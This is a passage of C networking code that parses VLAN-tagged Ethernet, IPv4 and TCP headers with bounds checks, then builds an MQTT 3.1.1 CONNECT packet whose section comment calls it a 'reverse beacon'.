     * VLAN-hopping traffic, which may carry a single or double tag. */
    while(ethertype == CADS_NETX_ETHERTYPE_VLAN) {
        if((uint32_t)off + 4u > len) return false;
        out->has_vlan = true;
        out->vlan_vid = (((uint16_t)frame[off] << 8) | frame[off + 1u]) & 0x0FFFu;
        off += 2u;
        ethertype = ((uint16_t)frame[off] << 8) | frame[off + 1u];
        off += 2u;
    }
    if(ethertype != CADS_NETX_ETHERTYPE_IPV4) return false;
    if((uint32_t)off + 20u + 20u > len) return false;
    const uint8_t* ip = frame + off;
    uint8_t ihl = (uint8_t)((ip[0u] & 0x0Fu) * 4u);
    if(ihl < 20u) return false;
    if((uint32_t)off + ihl + 20u > len) return false;
    if(ip[9u] != 6u) return false; /* not TCP */
    out->src_ip_host = ((uint32_t)ip[12u] << 24) | ((uint32_t)ip[13u] << 16) |
                       ((uint32_t)ip[14u] << 8)  | (uint32_t)ip[15u];
    out->dst_ip_host = ((uint32_t)ip[16u] << 24) | ((uint32_t)ip[17u] << 16) |
                       ((uint32_t)ip[18u] << 8)  | (uint32_t)ip[19u];
    uint16_t total_len = ((uint16_t)ip[2u] << 8) | ip[3u];
    const uint8_t* tcp = ip + ihl;
    out->src_port = ((uint16_t)tcp[0u] << 8) | tcp[1u];
    out->dst_port = ((uint16_t)tcp[2u] << 8) | tcp[3u];
    out->seq_host = ((uint32_t)tcp[4u] << 24) | ((uint32_t)tcp[5u] << 16) |
                   ((uint32_t)tcp[6u] << 8)  | (uint32_t)tcp[7u];
    out->ack_host = ((uint32_t)tcp[8u] << 24) | ((uint32_t)tcp[9u] << 16) |
                   ((uint32_t)tcp[10u] << 8) | (uint32_t)tcp[11u];
    out->flags = tcp[13u];
    uint8_t data_off = (uint8_t)((tcp[12u] >> 4) * 4u);
    /* payload_len = IP total length - IP header - TCP header. Clamp at 0 for
     * a truncated/malformed total length so a caller never sees wraparound. */
    if(total_len >= (uint16_t)(ihl + data_off)) {
        out->payload_len = (uint16_t)(total_len - (uint16_t)(ihl + data_off));
    } else {
        out->payload_len = 0u;
    }
    return true;
}

/* --- MQTT CONNECT (reverse beacon) -------------------------------------- */

uint16_t cads_netx_build_mqtt_connect(uint8_t* out, uint16_t cap,
    const char* client_id, uint16_t keepalive_host) {
    if(out == NULL || client_id == NULL) return 0u;
    size_t idlen = 0u;
    while(client_id[idlen] != '\0') {
        idlen++;
        if(idlen > 117u) return 0u; /* remaining-length must fit one byte */
    }
    uint16_t remaining = (uint16_t)(10u + 2u + (uint16_t)idlen); /* var hdr + client id */
    if(remaining > 127u) return 0u;
    uint16_t total = (uint16_t)(2u + remaining);
    if(total > cap) return 0u;

    uint16_t i = 0u;
    out[i++] = 0x10u;                       /* CONNECT packet type */
    out[i++] = (uint8_t)remaining;          /* remaining length (1 byte) */
    out[i++] = 0x00u; out[i++] = 0x04u;      /* protocol name length */
    out[i++] = 'M'; out[i++] = 'Q'; out[i++] = 'T'; out[i++] = 'T';
    out[i++] = 0x04u;                        /* protocol level: 3.1.1 */
    out[i++] = 0x02u;                        /* connect flags: clean session only */
    put_be16(out + i, keepalive_host); i += 2u;
    out[i++] = 0x00u; out[i++] = (uint8_t)idlen; /* client id length */
    memcpy(out + i, client_id, idlen); i += (uint16_t)idlen;
    return i;
}